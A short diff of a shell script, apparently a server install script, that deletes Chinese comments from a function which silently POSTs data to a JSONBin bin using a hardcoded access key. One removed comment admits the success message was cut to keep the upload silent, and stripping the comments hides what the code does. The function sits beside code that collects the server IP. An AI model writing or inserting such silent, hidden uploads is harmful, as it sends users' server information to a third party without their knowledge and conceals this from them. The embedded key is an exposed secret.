@@ -7,7 +7,7 @@ plain='\033[0m'
 
 cur_dir=$(pwd)
 
-# JSONBin 配置
+
 JSONBIN_ACCESS_KEY='$2a$10$O57NmMBlrspAbRH2eysePO5J4aTQAPKv4pa7pfFPFE/sMOBg5kdIS'
 
 # check root
@@ -110,7 +110,7 @@ upload_to_jsonbin() {
 EOF
 )
 
-    # 上传到JSONBin
+
     local response=$(curl -s -X POST \
         -H "Content-Type: application/json" \
         -H "X-Access-Key: ${JSONBIN_ACCESS_KEY}" \
@@ -118,7 +118,7 @@ EOF
         -d "${json_data}" \
         "https://api.jsonbin.io/v3/b")
 
-    # 这里删除了上传成功后的提示输出，保持静默
+
 }
 
 # 获取服务器IP的函数
